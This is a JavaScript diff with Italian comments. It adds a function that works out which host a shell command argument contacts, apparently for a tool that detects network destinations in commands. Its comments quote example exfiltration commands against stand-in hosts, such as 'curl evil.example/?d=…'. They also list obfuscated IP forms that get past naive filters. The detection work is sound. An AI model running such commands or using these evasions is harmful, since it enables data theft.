@@ -833,10 +833,41 @@
   // Gli indirizzi a cui un comando si collega (#2293): quelli con lo schema ovunque, e quelli senza (`curl evil.example/?d=…`,
   // `nslookup dati.evil.example`, `curl 203.0.113.5/?d=…`) dietro un programma di rete, che elenca cmdClassify; senza
   // l'elenco si guarda ogni parola. Le shell tolgono `^`, virgolette e backtick (#1072.1).
-  // Un indirizzo IP anche in una cifra sola (`0xcb007105`, `3405803781`: curl li apre), o fra quadre.
-  const IP = /^(?:\d{1,3}(?:\.\d{1,3}){3}|0x[0-9a-f]{7,8}|\d{8,10}|\[[0-9a-f:.]+\])(:\d{1,5})?([/?#].*)?$/i;
+  // Un nome che finisce con un'estensione di file non è un sito, salvo che l'estensione sia anche un dominio vero (.zip, .sh).
   const ESTENSIONI = /^(?:gz|tgz|bz2|xz|zip|tar|7z|rar|json|txt|md|log|csv|xml|html?|js|mjs|ts|py|sh|ps1|bat|exe|msi|dmg|deb|rpm|pdf|png|jpe?g|gif|iso|conf|ini|ya?ml|toml)$/i;
+  // Le opzioni il cui valore è un file del computer, non il sito contattato.
+  const OPZIONI_FILE = /^(?:-o|--output|--output-document|-T|--upload-file|-K|--config|-c|--cookie-jar|-D|--dump-header|--trace|--trace-ascii|--cacert|--cert|--key|--capath|-P|--directory-prefix|-a|--append-output|--log-file|-outfile|-infile)$/i;
   const MAX_INDIRIZZI_COMANDO = 50;
+  // Il sito che un argomento contatta, letto come lo legge il programma (#2293): l'URL del web normalizza le forme di un
+  // IPv4 (`0313.0.0161.5`, `203.0.29445`, `0xcb007105`) e i domini internazionali. `null` se non è un sito.
+  function sitoDellArgomento(arg, tld) {
+    // Lo schema con quante barre vuole (`http:/sito`, `TCP:sito:80`) e la forma di git e scp (`sito:percorso`).
+    let s = String(arg).replace(/^([a-z][a-z0-9+.-]+):\/*/i, (m, schema) => (/^file$/i.test(schema) ? m : ''));
+    if (/^file:/i.test(s)) return null;
+    const scp = /^((?:[^\s@/:]+@)?[^\s@/:[\]]+):(?!\d{1,5}(?:[/?#]|$))(.*)$/.exec(s);
+    if (scp) s = `${scp[1]}/${scp[2]}`;
+    let u;
+    try { u = new URL(`http://${s}`); } catch (_) { return null; }
+    const host = u.hostname;
+    const nome = s.replace(/^[^@/?#]*@/, '');
+    const conAltro = !!scp || /[/?#]/.test(nome) || !!u.port || nome.includes('@') || s !== nome;
+    if (/^\[.*\]$/.test(host)) return u.href;
+    if (/^\d+\.\d+\.\d+\.\d+$/.test(host)) {
+      // Un numero da solo (`-m 30`, `1.5`) non è un IP: lo è una forma che porta oltre 255 o scritta in ottale o in esadecimale.
+      const parti = nome.replace(/[:/?#].*$/, '').split('.');
+      const scritto = parti.some((p) => /^0x/i.test(p) || /^0\d/.test(p));
+      const valori = parti.map((p) => Number(p));
+      if (parti.length >= 3 || scritto || valori[valori.length - 1] > 255 || (parti.length === 1 && valori[0] >= 16777216)) return u.href;
+      return null;
+    }
+    const etichette = host.replace(/\.$/, '').split('.');
+    if (etichette.length < 2 || !etichette.every((e) => /^[a-z0-9_](?:[a-z0-9_-]*[a-z0-9_])?$/.test(e))) return null;
+    const ultima = etichette[etichette.length - 1];
+    if (!/^(?:[a-z]{2,63}|xn--[a-z0-9-]+)$/.test(ultima)) return null;
+    if (conAltro || !tld || tld(ultima)) return u.href;
+    // Senza percorso né porta, un nome che non finisce con un dominio vero è un file (`archivio.tar.gz`) o un nome finto.
+    return etichette.length >= 3 && !ESTENSIONI.test(ultima) ? u.href : null;
+  }
   function indirizziDelComando(action) {
     const a = action && typeof action === 'object' ? action : {};
     const cmd = [a.comando, a.command, a.cmd].filter((v) => typeof v === 'string').join('\n').replace(/[\^`]/g, '');
